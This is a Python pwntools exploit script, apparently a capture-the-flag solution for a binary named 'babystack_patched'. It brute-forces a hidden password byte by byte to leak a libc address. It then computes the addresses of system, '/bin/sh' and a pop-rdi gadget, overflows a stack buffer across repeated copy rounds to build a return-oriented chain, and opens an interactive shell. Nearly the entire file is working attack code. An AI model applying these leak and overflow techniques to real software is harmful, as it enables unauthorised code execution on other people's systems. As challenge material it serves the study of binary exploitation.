#!/usr/bin/python3
from pwn import *

# Replace 'your_binary' with the actual name or path of your binary
exe = ELF('./babystack_patched')
binary_path = './babystack_patched'
libc = ELF('./libc.so.6')

p = process(binary_path) 
context.log_level = 'error'
# context.terminal = ['alacritty', '-e']
# gdb.attach(p, gdbscript='''
# # b*0x000000000000E1E  + 0x0000555555400000 
# # b*0x555555400ee1
# # b*0x555555400f78
# # b*0x555555400cbe
#            # c 
#            ''')
###############
#################
#
# stack_leak = b''
# while len(stack_leak) < 22:
#     for i in range(1, 256): 
#         p.sendafter(b'>>',b'1')
#         p.sendafter(b'passowrd :' ,  stack_leak + p8(i)  +  p8(0))
#         response = p.recvline(13)
#         if b'Login Success' in response:
#             print("Found password: " + str(i))
#             stack_leak += p8(i)
#             print("stack_leak : " + str(stack_leak))
#             p.sendafter(b'>>',b'1')
#             break 
# stack_addr = u64(stack_leak[16:] + b'\x00\x00')
# log.info("stack_addr: " + hex(stack_addr))
leak_content = b''

p.sendafter(b'>>',b'a' * 16)

while len(leak_content) < 38:
    for i in range(1, 256): 
        p.sendafter(b'>>',b'1')
        p.sendafter(b'passowrd :' ,  leak_content + p8(i)  +  p8(0))
        response = p.recvline(13)
        if b'Login Success' in response:
            print("Found password: " + str(i))
            leak_content += p8(i)
            print("leak_content: " + str(leak_content))
            p.sendafter(b'>>',b'1')
            break 
password = leak_content.split(b'a'*15)[0][:-1]
passpart1 = u64(password[:-8])
passpart2 = u64(password[-8:])
log.info("passpart1: " + hex(passpart1))
log.info("passpart2: " + hex(passpart2))
leak_addr = u64(leak_content.split(b'a'*15)[1] + b'\x00\x00')
log.info("leak_addr: " + hex(leak_addr))

#################################################################
# pop_rax = 0x0000000000033544 + libc_base 
# syscall = 0x00000000000026bf + libc_base
# shelladdr = stack_addr - 377
# fini_addr = shelladdr - 0x201d48 
# fake_rbp = stack_addr - 0x181 
libc_base = leak_addr -4198496
pop_rdi = 0x0000000000021102 + libc_base 
bin_sh = 1622391 + libc_base 
libc_system = 0x45390 + libc_base
# ret = 4197646 + libc_base
# read = 4198017 + libc_base
# fake_rbp_heap = 3944622 + libc_base  
log.info("libc_base: " + hex(libc_base))
# log.info("shelladdr: " + hex(shelladdr))
# log.info("pop_rax: " + hex(pop_rax))
# log.info("fake_rbp: " + hex(fake_rbp))
# log.info("leave_ret: " + hex(leave_ret))
log.info("pop_rdi: " + hex(pop_rdi))
# log.info ("stack_addr: " + hex(stack_addr))
log.info("libc_system: " + hex(libc_system))

###########system ########################
sys1 = libc_system >> 16
sys2 = (libc_system  & 0xffff) >> 8
sys3 = libc_system & 0xff 
p.sendafter(b'>>',b'1')
p.sendafter(b'passowrd :', password +p8(0) + b'a'*(0x30 -0x1 ) + password + b'a'* 0x18  + b'a'*8 +b'aaaaaaaaaa'   + p32(sys1) )
p.sendafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a'*63)

p.sendafter(b'>>',b'1')
p.sendafter(b'>>',b'1')
p.sendafter(b'passowrd :', password +p8(0) + b'a'*(0x30 -0x1 ) + password + b'a'* 0x18  + b'a'*8 +b'aaaaaaaaa'   + p8(sys2) )
p.sendafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a'*63)

p.sendafter(b'>>',b'1')
p.sendafter(b'>>',b'1')
p.sendafter(b'passowrd :', password +p8(0) + b'a'*(0x30 -0x1 ) + password + b'a'* 0x18  + b'a'*8 +b'aaaaaaaa'   + p8(sys3) )
p.sendafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a'*63)


##################/bin/sh#####################
p.sendafter(b'>>',b'1')
p.sendafter(b'>>',b'1')
p.sendafter(b'passowrd :', password +p8(0) + b'a'*(0x30 -0x1 ) + password + b'a'*(0x21)  + p64(0x7fffffffffff)  )
p.sendafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a'*63)



p.sendafter(b'>>',b'1')
p.sendafter(b'>>',b'1')
p.sendafter(b'passowrd :', password +p8(0) + b'a'*(0x30 -0x1 ) + password + b'a'* 0x20  + p64(bin_sh)  )
p.sendafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a'*63)


###############pop rdi#####################
p.sendafter(b'>>',b'1')
p.sendafter(b'>>',b'1')
p.sendafter(b'passowrd :', password +p8(0) + b'a'*(0x30 -0x1 ) + password + b'a'*(0x19)  + p64(0x7fffffffffff)  )
p.sendafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a'*63)



p.sendafter(b'>>',b'1')
p.sendafter(b'>>',b'1')
p.sendafter(b'passowrd :', password +p8(0) + b'a'*(0x30 -0x1 ) + password + b'a'* 0x18  + p64(pop_rdi)  )
p.sendafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a'*63)



# p.sendafter(b'>>',b'3')
# payload = p64(pop_rdi) + p64(bin_sh) + p64(libc_system)  
# p.sendafter(b'Copy :',payload)

# print("leak_content: " + hex(u64(leak_addr + b'\x00\x00')))
    # print("password: " + hex(u64(password)))
p.interactive()
# s[128] addr : 0x7fffffffe520
# dest_copy = 0x7fffffffe540
# $rbp-0x20: random password
#originpassword = 0x000015555554a000
#.fini_array_offset = 0x201d48

